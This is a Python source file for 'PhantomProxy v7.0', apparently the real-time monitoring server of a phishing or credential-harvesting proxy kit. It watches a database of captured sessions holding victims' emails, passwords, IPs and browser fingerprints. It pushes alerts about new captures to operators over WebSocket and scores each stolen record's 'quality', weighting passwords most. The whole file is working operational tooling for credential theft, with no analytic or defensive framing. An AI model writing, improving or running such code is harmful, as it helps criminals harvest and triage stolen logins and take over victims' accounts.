#!/usr/bin/env python3
"""
PhantomProxy v7.0 - Real-Time WebSocket Notifications
- Мгновенные уведомления о новых сессиях
- Live статистика
- Real-time обновления
"""

import asyncio
import websockets
import json
import sqlite3
import time
from datetime import datetime
from pathlib import Path

DB_PATH = Path('/home/ubuntu/phantom-proxy/phantom.db')

# Хранилище подключенных клиентов
connected_clients = set()
last_session_id = 0

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def check_new_sessions():
    """Проверка новых сессий"""
    global last_session_id
    
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT MAX(id) FROM sessions')
        result = c.fetchone()[0]
        conn.close()
        
        current_id = result or 0
        
        if current_id > last_session_id:
            # Есть новые сессии
            conn = get_db()
            c = conn.cursor()
            c.execute('SELECT * FROM sessions WHERE id > ? ORDER BY id DESC', (last_session_id,))
            sessions = [dict(row) for row in c.fetchall()]
            conn.close()
            
            last_session_id = current_id
            return sessions
        
        return []
    except Exception as e:
        print(f'Error checking sessions: {e}')
        return []

async def notify_clients(message):
    """Отправка уведомления всем подключенным клиентам"""
    if connected_clients:
        await asyncio.gather(
            *[client.send(json.dumps(message)) for client in connected_clients],
            return_exceptions=True
        )

async def websocket_handler(websocket, path):
    """Обработка WebSocket подключений"""
    connected_clients.add(websocket)
    print(f'✅ Client connected. Total: {len(connected_clients)}')
    
    try:
        # Отправка текущей статистики при подключении
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        conn.close()
        
        await websocket.send(json.dumps({
            'type': 'connected',
            'message': 'Connected to PhantomProxy Real-Time',
            'total_sessions': total,
            'timestamp': datetime.now().isoformat()
        }))
        
        # Обработка входящих сообщений
        async for message in websocket:
            try:
                data = json.loads(message)
                print(f'📥 Received: {data}')
                
                # Ответ на ping
                if data.get('type') == 'ping':
                    await websocket.send(json.dumps({
                        'type': 'pong',
                        'timestamp': datetime.now().isoformat()
                    }))
            except json.JSONDecodeError:
                pass
    
    except websockets.exceptions.ConnectionClosed:
        print(f'❌ Client disconnected')
    finally:
        connected_clients.discard(websocket)

async def session_monitor():
    """Мониторинг новых сессий"""
    global last_session_id
    
    # Получаем последний ID при старте
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT MAX(id) FROM sessions')
        result = c.fetchone()[0]
        conn.close()
        last_session_id = result or 0
    except:
        last_session_id = 0
    
    print(f'🔍 Monitoring sessions from ID: {last_session_id}')
    
    while True:
        await asyncio.sleep(5)  # Проверка каждые 5 секунд
        
        new_sessions = check_new_sessions()
        
        if new_sessions:
            print(f'🎯 New sessions detected: {len(new_sessions)}')
            
            # Отправка уведомлений
            for session in new_sessions:
                notification = {
                    'type': 'new_session',
                    'session': session,
                    'quality': calculate_quality(session),
                    'timestamp': datetime.now().isoformat()
                }
                await notify_clients(notification)
            
            # Отправка обновлённой статистики
            stats = get_stats()
            await notify_clients({
                'type': 'stats_update',
                'stats': stats,
                'timestamp': datetime.now().isoformat()
            })

def calculate_quality(session):
    """Расчёт качества сессии"""
    score = 0
    
    if session.get('email'): score += 20
    if session.get('password'): score += 30
    if session.get('user_agent'): score += 15
    if session.get('screen_resolution'): score += 10
    if session.get('timezone'): score += 10
    if session.get('ip') and session['ip'] != 'unknown': score += 15
    
    if score >= 80: classification = 'EXCELLENT'
    elif score >= 60: classification = 'GOOD'
    elif score >= 40: classification = 'AVERAGE'
    else: classification = 'LOW'
    
    return {'score': score, 'classification': classification}

def get_stats():
    """Получение статистики"""
    try:
        conn = get_db()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        return {
            'total': total,
            'today': today,
            'services': services
        }
    except:
        return {'total': 0, 'today': 0, 'services': {}}

async def main():
    """Запуск сервера"""
    print('🚀 PhantomProxy v7.0 Real-Time Server')
    print('📡 WebSocket: ws://localhost:8765')
    print('🔍 Session Monitor: Active (5s interval)')
    print('')
    
    # Запуск сервера
    server = await websockets.serve(websocket_handler, "0.0.0.0", 8765)
    
    # Запуск мониторинга
    monitor_task = asyncio.create_task(session_monitor())
    
    await asyncio.gather(server.wait_closed(), monitor_task)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('\n👋 Server stopped')
